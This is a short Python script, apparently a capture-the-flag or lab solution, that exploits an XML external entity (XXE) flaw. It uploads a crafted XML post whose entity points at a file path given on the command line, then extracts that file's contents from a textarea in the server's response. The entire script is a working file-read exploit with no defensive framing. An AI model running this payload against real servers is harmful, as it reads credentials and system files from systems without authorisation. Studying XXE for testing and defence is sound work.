import argparse
import requests
import re

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('-u', '--url', help='Url of the request', required=True)
parser.add_argument('-f', '--file', help='File to request', required=True)


args = parser.parse_args()
args = vars(args)
url = args['url']
file = args['file']


def get_http(filename):
    xml = f'''<?xml version="1.0"?>
    <!DOCTYPE data [
    <!ENTITY file SYSTEM "file://{filename}">
    ]>
    <post>
        <title>Example Post</title>
        <description>Example Description</description>
        <markdown>&file;</markdown>
    </post>
    '''
    x = requests.post(url=url, files={'file': ('test.xml', xml)})
    return x.text


text = get_http(file)
text = re.findall(r'<textarea.*?>(.*?)</textarea>', text, re.DOTALL)[1]
print(text)